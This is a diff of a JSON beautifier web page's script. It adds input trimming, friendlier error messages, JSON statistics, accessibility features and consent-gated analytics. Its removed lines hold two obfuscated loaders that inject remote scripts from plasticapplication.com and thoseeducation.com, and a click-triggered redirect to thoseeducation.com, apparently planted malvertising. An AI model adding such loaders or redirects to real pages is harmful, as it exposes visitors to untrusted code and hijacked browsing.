+                        if (!zipEntry.dir && (filename.toLowerCase().endsWith('.json') || filename.toLowerCase().endsWith('.txt'))) {
                             try {
                                 const content = await zipEntry.async('text');
-                                JSON.parse(content); // Validate JSON
-                                return { success: true, content: content };
+                                const trimmedContent = content.trim();
+                                if (trimmedContent) {
+                                    JSON.parse(trimmedContent); // Validate JSON
+                                    return { success: true, content: trimmedContent };
+                                }
                             } catch (e) {
-                                // Not a valid JSON, continue to next file
+                                // Not valid JSON, continue to next file
+                                continue;
                             }
                         }
                     }
                     return { success: false };
                 } catch (error) {
+                    console.error('ZIP processing error:', error);
                     return { success: false };
                 }
             }
@@ -1343,16 +1981,26 @@
                     const reader = new FileReader();
                     reader.onload = (e) => {
                         try {
-                            const content = e.target.result;
-                            JSON.parse(content); // Validate JSON
-                            resolve({ success: true, content: content });
+                            const content = e.target.result.trim();
+                            if (content) {
+                                JSON.parse(content); // Validate JSON
+                                resolve({ success: true, content: content });
+                            } else {
+                                resolve({ success: false });
+                            }
                         } catch (error) {
                             resolve({ success: false });
                         }
                     };
                     reader.onerror = () => resolve({ success: false });
-                    reader.readAsText(file);
+                    reader.readAsText(file, 'UTF-8');
                 });
+            }
+
+            escapeHtml(text) {
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
             }
 
             formatFileSize(bytes) {
@@ -1367,7 +2015,8 @@
                 const input = elements.inputJson.value.trim();
                 
                 if (!input) {
-                    showMessage('❌ Please enter JSON or upload a file first!', 'error');
+                    showMessage('❌ Please enter JSON data or upload a file first.', 'error');
+                    elements.inputJson.focus();
                     return;
                 }
 
@@ -1379,14 +2028,20 @@
                     this.autoResize(elements.outputJson);
                     this.enableOutputButtons();
                     
-                    showMessage('✅ JSON successfully beautified!', 'success');
+                    // Calculate stats
+                    const stats = this.calculateJsonStats(parsed);
+                    showMessage(`✅ JSON beautified successfully! ${stats}`, 'success');
                     
                     // Track beautify event
-                    this.trackEvent('json_beautify', 'beautify_success');
+                    this.trackEvent('json_beautify', 'beautify_success', input.length);
                 } catch (error) {
-                    showMessage('❌ Invalid JSON! Please check your JSON format: ' + error.message, 'error');
+                    const errorMsg = this.getFormattedJsonError(error.message);
+                    showMessage(`❌ Invalid JSON format: ${errorMsg}`, 'error');
                     elements.outputJson.value = '';
                     this.disableOutputButtons();
+                    
+                    // Track error
+                    this.trackEvent('json_error', 'parse_error');
                 }
             }
 
@@ -1394,16 +2049,20 @@
                 const input = elements.inputJson.value.trim();
                 
                 if (!input) {
-                    showMessage('❌ Please enter JSON first!', 'error');
+                    showMessage('❌ Please enter JSON data to validate.', 'error');
+                    elements.inputJson.focus();
                     return;
                 }
 
                 try {
-                    JSON.parse(input);
-                    showMessage('✅ Valid JSON!', 'success');
-                    this.trackEvent('json_validate', 'validate_success');
+                    const parsed = JSON.parse(input);
+                    const stats = this.calculateJsonStats(parsed);
+                    showMessage(`✅ Valid JSON! ${stats}`, 'success');
+                    this.trackEvent('json_validate', 'validate_success', input.length);
                 } catch (error) {
-                    showMessage('❌ Invalid JSON: ' + error.message, 'error');
+                    const errorMsg = this.getFormattedJsonError(error.message);
+                    showMessage(`❌ Invalid JSON: ${errorMsg}`, 'error');
+                    this.trackEvent('json_validate', 'validate_error');
                 }
             }
 
@@ -1411,7 +2070,7 @@
                 const input = elements.outputJson.value.trim();
                 
                 if (!input) {
-                    showMessage('❌ No JSON to minify!', 'error');
+                    showMessage('❌ No JSON output to minify. Please beautify JSON first.', 'error');
                     return;
                 }
 
@@ -1419,56 +2078,71 @@
                     const parsed = JSON.parse(input);
                     const minified = JSON.stringify(parsed);
                     
+                    const originalSize = input.length;
+                    const minifiedSize = minified.length;
+                    const savings = ((originalSize - minifiedSize) / originalSize * 100).toFixed(1);
+                    
                     elements.outputJson.value = minified;
                     this.autoResize(elements.outputJson);
                     
-                    showMessage('✅ JSON successfully minified!', 'success');
-                    this.trackEvent('json_minify', 'minify_success');
+                    showMessage(`✅ JSON minified! Size reduced by ${savings}% (${originalSize} → ${minifiedSize} characters)`, 'success');
+                    this.trackEvent('json_minify', 'minify_success', originalSize);
                 } catch (error) {
-                    showMessage('❌ Error minifying: ' + error.message, 'error');
+                    showMessage('❌ Error minifying JSON: ' + error.message, 'error');
                 }
             }
 
             async copyToClipboard() {
+                const content = elements.outputJson.value;
+                if (!content) {
+                    showMessage('❌ No JSON output to copy.', 'error');
+                    return;
+                }
+
                 try {
-                    await navigator.clipboard.writeText(elements.outputJson.value);
-                    showMessage('✅ JSON successfully copied to clipboard!', 'success');
-                    this.trackEvent('copy_json', 'copy_success');
-                } catch (error) {
-                    // Fallback for older browsers
-                    try {
+                    if (navigator.clipboard && window.isSecureContext) {
+                        await navigator.clipboard.writeText(content);
+                        showMessage(`✅ JSON copied to clipboard! (${content.length} characters)`, 'success');
+                    } else {
+                        // Fallback for older browsers or non-HTTPS
                         elements.outputJson.select();
                         document.execCommand('copy');
-                        showMessage('✅ JSON successfully copied to clipboard!', 'success');
-                        this.trackEvent('copy_json', 'copy_success');
-                    } catch (fallbackError) {
-                        showMessage('❌ Failed to copy to clipboard.', 'error');
+                        showMessage(`✅ JSON copied to clipboard! (${content.length} characters)`, 'success');
                     }
+                    this.trackEvent('copy_json', 'copy_success', content.length);
+                } catch (error) {
+                    showMessage('❌ Failed to copy to clipboard. Please select and copy manually.', 'error');
+                    elements.outputJson.select();
                 }
             }
 
             downloadJson() {
                 const content = elements.outputJson.value;
                 if (!content) {
-                    showMessage('❌ No JSON to download!', 'error');
+                    showMessage('❌ No JSON output to download.', 'error');
                     return;
                 }
 
                 try {
-                    const blob = new Blob([content], { type: 'application/json' });
+                    const blob = new Blob([content], { type: 'application/json;charset=utf-8' });
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
+                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                    
                     a.href = url;
-                    a.download = `beautified-${new Date().getTime()}.json`;
+                    a.download = `beautified-json-${timestamp}.json`;
+                    a.style.display = 'none';
+                    
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
                     URL.revokeObjectURL(url);
                     
-                    showMessage('✅ JSON file successfully downloaded!', 'success');
-                    this.trackEvent('download_json', 'download_success');
+                    showMessage(`✅ JSON file downloaded successfully! (${content.length} characters)`, 'success');
+                    this.trackEvent('download_json', 'download_success', content.length);
                 } catch (error) {
-                    showMessage('❌ Failed to download file.', 'error');
+                    showMessage('❌ Failed to download file. Please try again.', 'error');
+                    console.error('Download error:', error);
                 }
             }
 
@@ -1481,6 +2155,42 @@
                 hideMessages();
                 this.autoResize(elements.inputJson);
                 this.autoResize(elements.outputJson);
+                elements.inputJson.style.borderColor = 'var(--border-color)';
+                
+                showMessage('🗑️ All data cleared successfully.', 'success');
+                this.trackEvent('clear_all', 'clear_success');
+            }
+
+            calculateJsonStats(jsonObj) {
+                const jsonStr = JSON.stringify(jsonObj);
+                const lines = jsonStr.split('\n').length;
+                const keys = this.countKeys(jsonObj);
+                return `${keys} keys, ${jsonStr.length} characters`;
+            }
+
+            countKeys(obj, count = 0) {
+                if (typeof obj === 'object' && obj !== null) {
+                    if (Array.isArray(obj)) {
+                        obj.forEach(item => count = this.countKeys(item, count));
+                    } else {
+                        count += Object.keys(obj).length;
+                        Object.values(obj).forEach(value => count = this.countKeys(value, count));
+                    }
+                }
+                return count;
+            }
+
+            getFormattedJsonError(errorMessage) {
+                // Make error messages more user-friendly
+                if (errorMessage.includes('Unexpected token')) {
+                    return 'Syntax error - check for missing commas, quotes, or brackets';
+                } else if (errorMessage.includes('Unexpected end')) {
+                    return 'Incomplete JSON - missing closing brackets or braces';
+                } else if (errorMessage.includes('position')) {
+                    const position = errorMessage.match(/position (\d+)/);
+                    return position ? `Error at character ${position[1]}` : errorMessage;
+                }
+                return errorMessage;
             }
 
             enableOutputButtons() {
@@ -1497,15 +2207,20 @@
 
             autoResize(textarea) {
                 textarea.style.height = 'auto';
-                textarea.style.height = Math.max(300, textarea.scrollHeight) + 'px';
+                const newHeight = Math.max(350, Math.min(800, textarea.scrollHeight));
+                textarea.style.height = newHeight + 'px';
             }
 
-            trackEvent(action, label) {
+            trackEvent(action, label, value = null) {
                 if (cookieManager.getAnalyticsConsent() && typeof gtag !== 'undefined') {
-                    gtag('event', action, {
-                        'event_category': 'tool_usage',
+                    const eventData = {
+                        'event_category': 'json_tool_usage',
                         'event_label': label
-                    });
+                    };
+                    if (value !== null) {
+                        eventData.value = value;
+                    }
+                    gtag('event', action, eventData);
                 }
             }
         }
@@ -1516,8 +2231,12 @@
             const element = type === 'error' ? elements.errorMessage : elements.successMessage;
             element.textContent = message;
             element.style.display = 'block';
+            element.setAttribute('aria-live', type === 'error' ? 'assertive' : 'polite');
             
-            setTimeout(hideMessages, 5000);
+            // Auto-hide after 6 seconds
+            setTimeout(() => {
+                hideMessages();
+            }, 6000);
         }
 
         function hideMessages() {
@@ -1527,11 +2246,21 @@
 
         // Scroll to Top Functionality
         function initScrollToTop() {
-            window.addEventListener('scroll', () => {
-                if (window.pageYOffset > 300) {
+            let ticking = false;
+            
+            function updateScrollButton() {
+                if (window.pageYOffset > 400) {
                     elements.scrollTop.classList.add('show');
                 } else {
                     elements.scrollTop.classList.remove('show');
+                }
+                ticking = false;
+            }
+
+            window.addEventListener('scroll', () => {
+                if (!ticking) {
+                    requestAnimationFrame(updateScrollButton);
+                    ticking = true;
                 }
             });
 
@@ -1540,75 +2269,153 @@
                     top: 0,
                     behavior: 'smooth'
                 });
+                // Track scroll to top usage
+                if (cookieManager.getAnalyticsConsent() && typeof gtag !== 'undefined') {
+                    gtag('event', 'scroll_to_top', {
+                        'event_category': 'navigation',
+                        'event_label': 'scroll_button'
+                    });
+                }
             });
         }
-        (function(eybvw){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = eybvw || {};
-s.src = "\/\/plasticapplication.com\/bVXUVbs.dzG\/ld0\/YnWHcV\/fepmj9SupZbU\/lxkgP\/TRYC1aN\/zhcW4\/MGT\/YWtRNajgUO3nNOz\/gCxVNMwJ";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
+
+        // Performance Monitoring
+        function initPerformanceMonitoring() {
+            if ('performance' in window && cookieManager.getPerformanceConsent()) {
+                // Monitor page load performance
+                window.addEventListener('load', () => {
+                    setTimeout(() => {
+                        const perfData = performance.getEntriesByType('navigation')[0];
+                        if (perfData && typeof gtag !== 'undefined') {
+                            gtag('event', 'page_load_time', {
+                                'event_category': 'performance',
+                                'value': Math.round(perfData.loadEventEnd - perfData.loadEventStart)
+                            });
+                        }
+                    }, 100);
+                });
+            }
+        }
+
+        // Accessibility Enhancements
+        function initAccessibility() {
+            // Skip to main content link
+            const skipLink = document.createElement('a');
+            skipLink.href = '#main-content';
+            skipLink.textContent = 'Skip to main content';
+            skipLink.style.cssText = `
+                position: absolute;
+                top: -40px;
+                left: 6px;
+                background: var(--primary-purple);
+                color: white;
+                padding: 8px;
+                text-decoration: none;
+                border-radius: 4px;
+                z-index: 1000;
+                transition: top 0.3s;
+            `;
+            skipLink.addEventListener('focus', () => {
+                skipLink.style.top = '6px';
+            });
+            skipLink.addEventListener('blur', () => {
+                skipLink.style.top = '-40px';
+            });
+            document.body.insertBefore(skipLink, document.body.firstChild);
+
+            // Add main content ID
+            document.querySelector('main').id = 'main-content';
+        }
+
+        // Error Handling
+        function initErrorHandling() {
+            window.addEventListener('error', (e) => {
+                console.error('Application error:', e.error);
+                showMessage('❌ An unexpected error occurred. Please refresh the page.', 'error');
+                
+                // Track errors if analytics enabled
+                if (cookieManager.getAnalyticsConsent() && typeof gtag !== 'undefined') {
+                    gtag('event', 'javascript_error', {
+                        'event_category': 'error',
+                        'event_label': e.error?.message || 'Unknown error'
+                    });
+                }
+            });
+
+            window.addEventListener('unhandledrejection', (e) => {
+                console.error('Unhandled promise rejection:', e.reason);
+                showMessage('❌ A processing error occurred. Please try again.', 'error');
+            });
+        }
 
         // Initialize Application
         document.addEventListener('DOMContentLoaded', () => {
             try {
-                // Initialize managers
+                // Initialize core managers
                 window.cookieManager = new CookieManager();
                 window.newsletterManager = new NewsletterManager();
                 window.jsonProcessor = new JSONProcessor();
                 
-                // Initialize other features
+                // Initialize additional features
                 initScrollToTop();
+                initAccessibility();
+                initErrorHandling();
+                initPerformanceMonitoring();
                 
-                console.log('VIN NESIA JSON Beautifier initialized successfully');
+                // Track page view if analytics enabled
+                setTimeout(() => {
+                    if (cookieManager.getAnalyticsConsent() && typeof gtag !== 'undefined') {
+                        gtag('event', 'page_view', {
+                            'event_category': 'engagement',
+                            'event_label': 'json_beautifier'
+                        });
+                    }
+                }, 1000);
+                
+                console.log('VIN NESIA JSON Beautifier v2.0 initialized successfully');
             } catch (error) {
                 console.error('Failed to initialize application:', error);
-                showMessage('❌ Failed to load application.', 'error');
+                showMessage('❌ Application failed to load properly. Please refresh the page.', 'error');
             }
         });
 
-        // Handle errors gracefully
-        window.addEventListener('error', (e) => {
-            console.error('Application error:', e.error);
-            showMessage('❌ An unexpected error occurred.', 'error');
-        });
-
-        // Service Worker for offline functionality (optional)
+        // Service Worker Registration for PWA Support
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
-                navigator.serviceWorker.register('/sw.js').catch(() => {
-                    // Service worker registration failed - not critical
-                });
+                navigator.serviceWorker.register('/sw.js')
+                    .then(registration => {
+                        console.log('ServiceWorker registered successfully');
+                    })
+                    .catch(error => {
+                        console.log('ServiceWorker registration failed (not critical)');
+                    });
             });
         }
-            (function(vehq){
-        var d = document,
-            s = d.createElement('script'),
-            l = d.scripts[d.scripts.length - 1];
-        s.settings = vehq || {};
-        s.src = "//thoseeducation.com/cVDt9/6Gb.2o5-lSSPWTQA9SNqjMUv3JNEzxcj2/NsiD0B2_NFT_cy3sNQzsYJ3I";
-        s.async = true;
-        s.referrerPolicy = 'no-referrer-when-downgrade';
-        l.parentNode.insertBefore(s, l);
-    })({})
-                function redirectNow() {
-    let lastRedirect = localStorage.getItem("lastRedirect");
-    let now = Date.now();
 
-    // Kalau belum pernah redirect atau sudah lewat 3 menit
-    if (!lastRedirect || now - lastRedirect > 3 * 60 * 1000) {
-        localStorage.setItem("lastRedirect", now);
-        window.location.href = "https://thoseeducation.com/b/3/V_0.PN3Hp-vRbom/VfJnZQDM0C2xN/Txcm3/NgzdYY2RLoT/Yz1/NszZcW3/Ngj/ct";
-    }
-}
-
-// Pas user klik di mana saja di halaman
-document.addEventListener("click", redirectNow);
-        <!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "b90fd629d8ab422faf5b64acdb755427"}'></script><!-- End Cloudflare Web Analytics -->
+        // Add screen reader only styles
+        const srOnlyStyle = document.createElement('style');
+        srOnlyStyle.textContent = `
+            .sr-only {
+                position: absolute !important;
+                width: 1px !important;
+                height: 1px !important;
+                padding: 0 !important;
+                margin: -1px !important;
+                overflow: hidden !important;
+                clip: rect(0, 0, 0, 0) !important;
+                white-space: nowrap !important;
+                border: 0 !important;
+            }
+            
+            .focused {
+                outline: 2px solid var(--primary-purple) !important;
+                outline-offset: 2px !important;
+            }
+        `;
+        document.head.appendChild(srOnlyStyle);
     </script>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "b90fd629d8ab422faf5b64acdb755427"}'></script>
 </body>
 </html>
